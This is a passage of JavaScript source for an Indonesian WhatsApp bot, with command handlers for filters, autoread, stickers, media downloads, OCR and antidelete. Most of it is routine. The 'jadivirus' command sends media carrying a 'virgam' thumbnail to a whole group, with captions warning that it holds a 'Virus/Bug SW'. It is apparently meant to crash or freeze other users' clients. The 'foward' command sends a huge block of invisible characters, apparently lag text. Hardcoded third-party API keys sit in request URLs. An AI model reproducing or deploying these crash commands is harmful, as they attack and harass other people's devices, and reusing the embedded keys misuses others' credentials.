					   filter.splice(del, 1)
					   fs.writeFileSync('./src/filter.json', JSON.stringify(filter))
					   reply(`Sukses Menghapus Respon ${q}`)
					}
					}
					break

case 'listrespon':
case 'listfilter':
   if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
   teks = `${uwu}「 LIST FILTER 」${uwu}\n\n`
   for (let i of filter) {
   teks += `• Filter : ${i.Filter}\n• Jawab : ${i.Jawaban}\n\n`
   }
   teks += `${uwu}「 TOTAL FILTER: ${filter.length} 」${uwu}`
   zacky.sendMessage(from, teks.trim(), extendedText, {quoted: mek})
   break

		    case 'autoread':
if (!mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length < 1) return reply(`Example:\n${prefix}autoread gc on`)
if (args[0] === "gc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread gc on`)
if (args[1] === "on") {
if (readGc === true) return
readGc = true
reply(`Succes mengaktifkan autoread group`)
} else if (args[1] === "off") {
if (readGc === false) return
readGc = false
reply(`Succes mematikan autoread group`)
} else {
reply(`Pilih on atau off`)
}
} else if (args[0] === "pc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread pc on`)
if (args[1] === "on") {
if (readPc === true) return reply(lang.anjawaUdhOn(command))
readPc = true
reply(`Succes mengaktifkan autoread pc`)
} else if (args[1] === "off") {
if (readPc === false) return
readPc = false
reply(`Succes mematikan autoread pc`)
} else {
reply(`Pilih on atau off`)
}
} else {
reply(`*List Auto Read*\n•> gc\n•> pc`)
}
break

          case 'autoketik':
if (!mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length < 1) return reply(`Example:\n${prefix}autoketik gc on`)
if (args[0] === "gc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoketik gc on`)
if (args[1] === "on") {
if (ketikgc === true) return
ketikgc = true
reply(`Succes mengaktifkan autoketik group`)
} else if (args[1] === "off") {
if (ketikgc === false) return
ketikgc = false
reply(`Succes mematikan autoketik group`)
} else {
reply(`Pilih on atau off`)
}
} else if (args[0] === "pc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoketik pc on`)
if (args[1] === "on") {
if (ketikpc === true) return
ketikpc = true
reply(`Succes mengaktifkan autoketik pc`)
} else if (args[1] === "off") {
if (ketikpc === false) return
ketikpc = false
reply(`Succes mematikan autoketik pc`)
} else {
reply(`Pilih on atau off`)
}
} else {
reply(`*List Auto Ketik*\n•> gc\n•> pc`)
}
break

          case 'antibug':
          if (!mek.key.fromMe && !isOwner && !isGroupAdmins) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
          if (args[0] === '1') {
          if (bugc === true) return
          bugc = true
          antitrol = true
          reply('Berhasil menyalakan antibug')
          } else if (args[0] === '0') {
          if (bugc === false) return
          bugc = false
          antitrol = false
          reply('Berhasil mematikan antibug')
          } else {
          reply('Pilih on atau off')
          }
          break  
            
                  case 'buttons1':
              if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
              if (isBanned) return reply('Maaf kamu sudah terbenned!')
              if (args.length < 1) return reply('Link Nya Mana?')              
              teks = args.join(' ')
              res = await y2mateA(teks)
              sendFileFromUrl(res[0].link, document, {thumbnail : fpp, quoted: mek, mimetype: 'audio/mp4', filename: res[0].output, contextInfo: {forwardingScore: 1000, isForwarded: true, externalAdReply: { title: `Youtube ${res[0].tipe}`, thumbnail: imageh, mediaType: 2, previewType: "VIDEO", mediaUrl: "https://youtu.be/dQw4w9WgXcQ"}}})
              break 

                  case 'buttons2':
              if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
              if (isBanned) return reply('Maaf kamu sudah terbenned!')
              if (args.length < 1) return reply('Link Nya Mana?')
              teks = args.join(' ')
              res = await y2mateV(teks)
              sendFileFromUrl(res[0].link, video, {quoted: mek, mimetype: 'video/mp4', caption: res[0].output, contextInfo: {forwardingScore: 1000, isForwarded: true}})
              break
              
                    case 'searchgc':
                    case 'carigc':
                if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                if (isBanned) return reply('Maaf kamu sudah terbenned!')
                if (args.length < 1) return reply('Nama group nya mana?')
                teks = args.join(' ')
                anu = await fetchJson(`https://hardianto-chan.herokuapp.com/api/search/linkwa?name=${teks}&apikey=hardianto`)                
whangsaf = `${uwu}「 GROUP SEARCH 」${uwu}

*❏ Nama :* ${anu.result.nama}
*◦➛ Link :* ${anu.result.link}`
zacky.sendMessage(from, whangsaf, text)
break				 

			         case 'afk':
		       	if (isAfkOn) return 
                reason = q ? q : 'Nothing'
                off.addAfkUser(sender, Date.now(), reason, _off)
		       	papa = `@${sender.split("@")[0]} Sekarang sedang AFK
		       	┈───┅──┅──❀──┅──┅───┈
		       	Alasan : *${reason}*`
                zacky.sendMessage(from, papa, text,{quoted: freply, contextInfo: {"mentionedJid": [sender], forwardingScore: 1000, isForwarded: true }})
                break                

			         case 'getdeskgc':
			         case 'getdeskripsi':
		       	if (!isGroup) return reply(ind.groupo())
		       	zacky.sendMessage(from, groupDesc, text,{quoted: mek, contextInfo: {forwardingScore: 1000, isForwarded: true }})
				break
				
			         case 'delete':
			         case 'del':
			         case 'd':
			         case 'hapus':
		       	if (!isGroup) return reply(ind.groupo())
		       	if (!mek.key.fromMe && !isGroupAdmins && !isOwner) return reply(ind.admin())
		       	zacky.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
		       	break
		       	
		       	     case 'teruskan':
			         case 'foward':
		       	if (isBanned) return reply('Maaf kamu sudah terbenned!')
				teks = q ? q : '͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏'
		       	zacky.sendMessage(from, teks, text,{quoted: mek, contextInfo: {forwardingScore: 1000, isForwarded: true }})				
				break
				     								
				    case 'antidelete':
				    case 'antihapus':
				if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())
				if (args[0] == 'aktif') {
				unvoke = true
				zacky.sendMessage(from, 'Antidelete Sudah *Diaktifkan* untuk semua chat!', text, {quoted: freply})
				} else if (args[0] == 'mati') {
				unvoke = false
				zacky.sendMessage(from, 'Antidelete Sudah *Dimatikan* untuk semua chat!', text, {quoted: freply})		
				} else {
				reply('*AKTIF* untuk mengaktifkan, *MATI* untuk menonaktifkan')
				}
				break

				    case 'on':   
				if (!mek.key.fromMe && !isOwner) return
				unvoke = true
				zacky.sendMessage(from, 'Antidelete Sudah *Diaktifkan* untuk semua chat!', text, {quoted: freply})
				break    	
				
				    case 'off':   
				if (!mek.key.fromMe && !isOwner) return
				unvoke = false
				zacky.sendMessage(from, 'antidelete Sudah *Dimatikan* untuk semua chat!', text, {quoted: freply})
				break
				
				    case 'mediafire':
if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (isBanned) return reply('Maaf kamu sudah terbenned!')
if (args.length < 1) return reply('Link Nya Mana?')
if (!isUrl(args[0]) && !args[0].includes('mediafire')) return reply(mess.error.api)
reply(mess.wait)
teks = args.join(' ')
res = await mediafireDl(teks)
result = `*「 MEDIAFIRE DOWNLOAD 」*

*Data Berhasil Didapatkan!*
\`\`\`🔖 Nama : ${res[0].nama}\`\`\`
\`\`\`🔖 Ukuran : ${res[0].size}\`\`\`
\`\`\`🔖 Link : ${res[0].link}\`\`\`

_File sedang dikirim, Silahkan tunggu beberapa menit_`
reply(result)
sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: mek})
				break
								 
				    case 'ocr':
				if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
				const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
				const media = await zacky.downloadAndSaveMediaMessage(encmedia)
				reply(mess.wait)
				await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
				.then(teks => {
				reply(teks.trim())
				fs.unlinkSync(media)
				})
				.catch(err => {
				reply(err.message)
				fs.unlinkSync(media)
				})
				} else {
				reply('Foto aja mas')
				}
				break
				
				    case 'tp':
				if (args.length < 1) {
				return reply('Pilih themenya om, 1 - 162')
				} else if (args[0].toLowerCase() === 'list') {
				teks = await fetchText('https://mhankbarbar.moe/api/textpro/listtheme')
				teks = teks.replace(/<br>/g, '\n')
				return reply(teks)
				} else if (args.length < 2) {
				return reply('Teksnya juga dong om')
				}
				reply(mess.wait)
				anu = `https://mhankbarbar.moe/api/textpro?pack=${args[0]}&text=${body.slice(3+args[0].length+1)}&apiKey=IDxO1TFYnKADlX4pxcHa`
				voss = await fetch(anu)	
				ftype = require('file-type')	
				vuss = await ftype.fromStream(voss.body)
				if (vuss !== undefined) {
				zacky.sendMessage(from, await getBuffer(anu), image, { caption: mess.success, quoted: mek })
				} else {
				reply('Terjadi kesalahan, silahkan pilih theme lain')
				}
				break
				    case 'ep':
				if (args.length < 1) {
				return reply('Pilih themenya om, 1 - 216')
				} else if (args[0].toLowerCase() === 'list') {
				teks = await fetchText('https://mhankbarbar.moe/api/ephoto/listtheme')
				teks = teks.replace(/<br>/g, '\n')
				return reply(teks)
				} else if (args.length < 2) {
				return reply('Teksnya juga dong om')
				}
				reply(mess.wait)
				anu = `https://mhankbarbar.moe/api/ephoto?pack=${args[0]}&text=${body.slice(3+args[0].length+1)}&apiKey=IDxO1TFYnKADlX4pxcHa`
				voss = await fetch(anu)
				ftype = require('file-type')
				vuss = await ftype.fromStream(voss.body)
				//console.log(vuss)
				if (vuss !== undefined) {
				zacky.sendMessage(from, await getBuffer(anu), image, { caption: mess.success, quoted: mek })
				} else {
				reply('Terjadi kesalahan, silahkan pilih theme lain')
				}
				break  	
							
		        case 'stiker':
				case 'sticker':
				case 's':
				if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				    if (isBanned) return reply('Maaf kamu sudah terbenned!')
		            var a = `ZACKY BOT`
		            var b = `Sticker Image by Zacky Official\n\n\n\n\n> Owner : ${manikganz.ownerNumber}\n\n\n\n\n> Bot : 62822281112309\n\n\n\n\n> Instagram : @lord_zacky69\n\n\n\nSticker Make for WhatsApp`
		            if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
		            const encmedia___ = isQuotedImage   ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
		             media___ = await zacky.downloadAndSaveMediaMessage(encmedia___)
		            await createExif(b)
		            out = getRandom('.webp')
		            ffmpeg(media___)
		            .on('error', (e) => {
		            console.log(e)
		            zacky.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
		            fs.unlinkSync(media___)
		            })
		            .on('end', () => {
		            _out = getRandom('.webp')
		            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
		            .on('exit', () => {
		            zacky.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek, contextInfo: {forwardingScore: 1000, isForwarded: true, externalAdReply:{title: `${pushname}`,body:"",mediaType:"2",thumbnail: fpp,sourceUrl:"https://chat.whatsapp.com/B5xKfSwQR3a6258K9DXhiR"}}})
		            fs.unlinkSync(out)
		            fs.unlinkSync(_out)
		            fs.unlinkSync(media___)
		            })
		            })
		            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
		            .toFormat('webp')
		            .save(out) 
		            } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
		            const encmedia___ = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
		            const media___ = await zacky.downloadAndSaveMediaMessage(encmedia___)
		            var a = `ZACKY BOT`
		            var b = `Sticker Video by Zacky Official\n\n\n\n\n> Owner : ${manikganz.ownerNumber}\n\n\n\n\n> Bot : 62822281112309\n\n\n\n\n> Instagram : @lord_zacky69\n\n\n\nSticker Make for WhatsApp`
		            await createExif(b)
		            out = getRandom('.webp')
		            ffmpeg(media___)
		            .on('error', (e) => {
		            console.log(e)
		            zacky.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
		            fs.unlinkSync(media___)
		            })
		            .on('end', () => {
		            _out = getRandom('.webp')
		            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
		            .on('exit', () => {
		            zacky.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek, contextInfo: {forwardingScore: 1000, isForwarded: true, externalAdReply:{title: `${pushname}`,body:"",mediaType:"2",thumbnail: fpp,sourceUrl:"https://chat.whatsapp.com/B5xKfSwQR3a6258K9DXhiR"}}})
		            fs.unlinkSync(out)
		            fs.unlinkSync(_out)
		            fs.unlinkSync(media___)
		            })
		            })
		            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
		            .toFormat('webp')
		            .save(out)       
		            } else {
		            reply(`Kirim gambar dengan caption ${prefix + command} atau tag gambar yang sudah dikirim`)
		            }
		            break

				    case 'sticker2': 
                    case 'stiker2':
                    case 's2':
                    if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				    if (isBanned) return reply('Maaf kamu sudah terbenned!')
		            var a = `ZACKY BOT`
		            var b = `@lord_zacky69`
		            if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
		            const encmedia___ = isQuotedImage   ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
		             media___ = await zacky.downloadAndSaveMediaMessage(encmedia___)
		            await createExif(a,b)
		            out = getRandom('.webp')
		            ffmpeg(media___)
		            .on('error', (e) => {
		            console.log(e)
		            zacky.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
		            fs.unlinkSync(media___)
		            })
		            .on('end', () => {
		            _out = getRandom('.webp')
		            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
		            .on('exit', () => {
		            zacky.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
		            fs.unlinkSync(out)
		            fs.unlinkSync(_out)
		            fs.unlinkSync(media___)
		            })
		            })
		            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
		            .toFormat('webp')
		            .save(out) 
		            } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
		            const encmedia___ = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
		            const media___ = await zacky.downloadAndSaveMediaMessage(encmedia___)
		            var a = `ZACKY BOT`
		            var b = `@lord_zacky69`
		            await createExif(a,b)
		            out = getRandom('.webp')
		            ffmpeg(media___)
		            .on('error', (e) => {
		            console.log(e)
		            zacky.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
		            fs.unlinkSync(media___)
		            })
		            .on('end', () => {
		            _out = getRandom('.webp')
		            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
		            .on('exit', () => {
		            zacky.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
		            fs.unlinkSync(out)
		            fs.unlinkSync(_out)
		            fs.unlinkSync(media___)
		            })
		            })
		            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
		            .toFormat('webp')
		            .save(out)       
		            } else {
		            reply(`Kirim gambar dengan caption ${prefix + command} atau tag gambar yang sudah dikirim`)
		            }
		            break

		        case 'stickerwm':		            
                case 'stikerwm':
                case 'swm':
                case 'wm':
		if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply('Maaf kamu sudah terbenned!')
                    pe = args.join(' ')
		            var a = pe.split("|")[0];
		            var b = pe.split("|")[1];
		            if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
		            const encmedia___ = isQuotedImage   ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
		             media___ = await zacky.downloadAndSaveMediaMessage(encmedia___)
		            await createExif(a,b)
		            out = getRandom('.webp')
		            ffmpeg(media___)
		            .on('error', (e) => {
		            console.log(e)
		            zacky.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
		            fs.unlinkSync(media___)
		            })
		            .on('end', () => {
		            _out = getRandom('.webp')
		            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
		            .on('exit', () => {
		            zacky.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek, contextInfo: {forwardingScore: 1000, isForwarded: true, externalAdReply:{title: `${pushname}`,body:"",mediaType:"2",thumbnail: fpp,sourceUrl:"https://chat.whatsapp.com/B5xKfSwQR3a6258K9DXhiR"}}})
		            fs.unlinkSync(out)
		            fs.unlinkSync(_out)
		            fs.unlinkSync(media___)
		            })
		            })
		            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
		            .toFormat('webp')
		            .save(out) 
		            } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
		            const encmedia___ = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
		            const media___ = await zacky.downloadAndSaveMediaMessage(encmedia___)
		            pe = args.join(' ')
		            var a = pe.split("|")[0];
		            var b = pe.split("|")[1];
		            await createExif(a,b)
		            out = getRandom('.webp')
		            ffmpeg(media___)
		            .on('error', (e) => {
		            console.log(e)
		            zacky.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
		            fs.unlinkSync(media___)
		            })
		            .on('end', () => {
		            _out = getRandom('.webp')
		            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
		            .on('exit', () => {
		            zacky.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek, contextInfo: {forwardingScore: 1000, isForwarded: true, externalAdReply:{title: `${pushname}`,body:"",mediaType:"2",thumbnail: fpp,sourceUrl:"https://chat.whatsapp.com/B5xKfSwQR3a6258K9DXhiR"}}})
		            fs.unlinkSync(out)
		            fs.unlinkSync(_out)
		            fs.unlinkSync(media___)
		            })
		            })
		            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
		            .toFormat('webp')
		            .save(out)       
		            } else {
		            reply(`Kirim gambar dengan caption ${prefix + command} teks|teks atau tag gambar yang sudah dikirim`)
		            }
		            break     
		            
		            case 'jadivirus':
		    if (!isGroup) return reply(ind.groupo())			
		    if (!mek.key.fromMe && !isGroupAdmins && !isOwner) return reply(ind.admin())		
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            const file = await zacky.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await zacky.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
               zacky.sendMessage(from, ini_buffer, sticker, { thumbnail : virgam, ftoko})
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            const file = await zacky.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await zacky.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            zacky.sendMessage(from, ini_buffer, image, { thumbnail : virgam, ftoko, options, caption: 'Nih Fotonya\n\n⚠️*Perhatian.!!*⚠️\nFoto ini Mengandung Virus/Bug SW!!'})
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            const file = await zacky.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await zacky.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'audio/mp4', duration: 359996400,
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
               zacky.sendMessage(from, ini_buffer, audio, { thumbnail : virgam, ftoko})
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            const file = await zacky.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await zacky.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
          zacky.sendMessage(from, ini_buffer, video, { thumbnail : virgam, ftoko, caption: 'Nih Videonya\n\n⚠️*Perhatian.!!*⚠️\nFoto ini Mengandung Virus/Bug SW!!'})
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/video/audio dengan caption ${prefix + command}`)
        }
        break
		            
		            case 'jadivirgam':
		            if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				    if (isBanned) return reply('Lu sudah terbenned!')
					if (!isQuotedSticker) return reply('Reply stiker nya')
					if (mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await zacky.downloadAndSaveMediaMessage(encmedia)
						const upload = await uploadimg(media, Date.now() + '.webp')
						console.log(upload)
						reply(`${upload.result.image}`)
